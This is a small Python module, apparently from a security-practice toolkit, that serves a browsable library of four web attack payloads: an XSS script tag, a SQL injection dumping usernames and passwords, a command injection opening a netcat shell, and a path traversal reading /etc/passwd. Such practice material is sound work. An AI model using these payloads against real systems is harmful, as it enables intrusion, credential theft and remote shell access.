"""Offline payload snippets for web exploitation practice."""

from __future__ import annotations

import json
from typing import Dict

from ..base import ToolResult

_PAYLOADS: Dict[str, str] = {
    "xss_basic": "<svg onload=alert('xss')>",
    "sqli_union": "' UNION SELECT username, password FROM users--",
    "command_injection": "; nc 127.0.0.1 4444 -e /bin/sh",
    "path_traversal": "../../../../etc/passwd",
}


class OfflinePayloadLibrary:
    name = "Payload Library"
    description = "Browse a curated set of offline payload examples."
    category = "Web"

    def run(self, query: str = "") -> ToolResult:
        if query:
            matches = {key: value for key, value in _PAYLOADS.items() if query.lower() in key.lower()}
        else:
            matches = _PAYLOADS
        body = json.dumps(matches, indent=2)
        return ToolResult(title="Payload examples", body=body, mime_type="application/json")
